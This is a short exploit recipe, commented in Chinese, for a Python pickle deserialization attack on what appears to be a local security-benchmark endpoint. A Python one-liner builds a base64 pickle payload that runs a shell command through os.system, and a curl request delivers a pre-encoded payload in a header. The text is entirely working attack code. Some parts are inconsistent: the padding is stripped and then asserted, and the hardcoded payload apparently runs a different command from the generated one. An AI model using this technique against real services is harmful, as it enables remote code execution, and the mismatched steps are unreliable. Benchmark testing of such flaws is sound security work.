# Python生成payload：
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/exploited',))
payload = pickle.dumps(RCE())
encoded = base64.urlsafe_b64encode(payload).rstrip(b'=').decode()
assert len(encoded) % 4 == 0, 'base64 length must be multiple of 4'
print(encoded)
"

# 发送利用请求（取上面输出的encoded值）：
curl -k -X POST 'https://127.0.0.1:8443/benchmark/deserialization-00/BenchmarkTest00605' \
  -H 'BenchmarkTest00605: gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBB0b3VjaCAvdG1wL3B3bmVklIWUUpQu' \
  -d 'dummy=1'

# 验证：响应应为"shared string is no pickles to be seen here"，且 touch 的目标文件存在